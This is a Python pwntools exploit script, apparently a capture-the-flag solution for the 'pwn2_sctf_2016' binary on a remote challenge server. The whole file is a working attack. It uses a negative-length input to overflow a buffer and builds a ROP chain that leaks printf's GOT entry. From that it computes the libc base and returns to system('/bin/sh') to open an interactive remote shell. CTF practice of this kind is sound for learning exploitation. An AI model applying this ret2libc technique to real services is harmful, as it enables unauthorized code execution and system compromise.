from pwn import *
from LibcSearcher import *
context(log_level='DEBUG')
io = remote("node3.buuoj.cn",25915)
#io = process("./pwn2_sctf_2016")
elf = ELF("./pwn2_sctf_2016")
libc = ELF("./libc-2.23.so")
io.recv()
printf_plt = elf.plt['printf']
vuln_addr = 0x0804852F
fmt_addr = 0x080486F8
printf_got = elf.got['printf']
payload = 'a'*(0x2c+4)+p32(printf_plt) +p32(vuln_addr)+p32(fmt_addr)+p32(printf_got)

io.sendline("-1")
io.sendline(payload)
io.recvuntil("You said: ")
io.recvuntil("You said: ")
printf_addr = u32(io.recv(4))
print hex(printf_addr)

libc_base = printf_addr - libc.sym['printf']

system_addr = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search('/bin/sh'))
io.recv()
io.sendline("-1")

payload = 'a'*(0x2c+4) + p32(system_addr)+p32(0xdeadbeef)+p32(bin_sh)
io.sendline(payload)

io.interactive()